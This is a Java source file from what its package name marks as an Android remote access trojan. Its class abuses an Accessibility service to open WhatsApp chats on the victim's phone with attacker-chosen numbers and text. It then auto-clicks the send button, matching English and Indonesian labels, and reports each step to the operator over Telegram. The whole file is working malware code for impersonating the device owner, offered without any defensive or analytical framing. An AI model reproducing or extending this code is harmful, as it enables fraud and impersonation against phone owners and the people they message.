package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.accessibility.AccessibilityNodeInfo;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;
import java.util.List;

public class WhatsAppImpersonationManager {
    private Context context;
    public WhatsAppImpersonationManager(Context context) { this.context = context; }

    public void sendMessage(String phoneNumber, String message) {
        AccessibilityService svc = AccessibilityService.getInstance();
        if (svc == null) { TelegramApi.sendMessage("❌ Accessibility not active."); return; }
        try {
            // Open WhatsApp chat with phone number
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(android.net.Uri.parse("https://wa.me/" + phoneNumber + "?text=" + android.net.Uri.encode(message)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Thread.sleep(3000);

            // Accessibility auto-click send button
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                AccessibilityNodeInfo root = svc.getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> sendButtons = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
                    if (sendButtons.isEmpty()) sendButtons = root.findAccessibilityNodeInfosByText("Send");
                    if (sendButtons.isEmpty()) sendButtons = root.findAccessibilityNodeInfosByText("Kirim");
                    if (!sendButtons.isEmpty()) {
                        sendButtons.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        TelegramApi.sendMessage("✅ WhatsApp message sent to " + phoneNumber);
                    } else {
                        TelegramApi.sendMessage("⚠ Send button not found. Message may be pending.");
                    }
                    for (AccessibilityNodeInfo btn : sendButtons) btn.recycle();
                    root.recycle();
                }
            }, 2000);
            TelegramApi.sendMessage("📲 Opening WhatsApp to " + phoneNumber + "...");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ WhatsApp error: " + e.getMessage());
        }
    }
}
